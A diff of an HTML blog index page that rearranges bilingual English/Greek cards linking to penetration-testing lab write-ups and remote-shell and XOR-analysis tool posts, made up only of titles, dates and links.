+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -1380,25 +978,21 @@ We could do also things like that et.c.:
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1421,16 +1015,60 @@ We could do also things like that et.c.:
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
     </footer>
   </a>
 </article>
@@ -1447,6 +1085,26 @@ We could do also things like that et.c.:
           
            
            
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1512,6 +1170,202 @@ We could do also things like that et.c.:
            
            
            
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
@@ -1531,6 +1385,110 @@ We could do also things like that et.c.:
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1568,17 +1526,113 @@ We could do also things like that et.c.:
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
     </footer>
   </a>
 </article>
@@ -1600,23 +1654,9 @@ We could do also things like that et.c.:
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
           
+          
+           
            
            
            
@@ -1624,23 +1664,142 @@ We could do also things like that et.c.:
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -1676,26 +1835,6 @@ We could do also things like that et.c.:
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -1758,56 +1897,46 @@ We could do also things like that et.c.:
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -1980,121 +2109,21 @@ We could do also things like that et.c.:
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
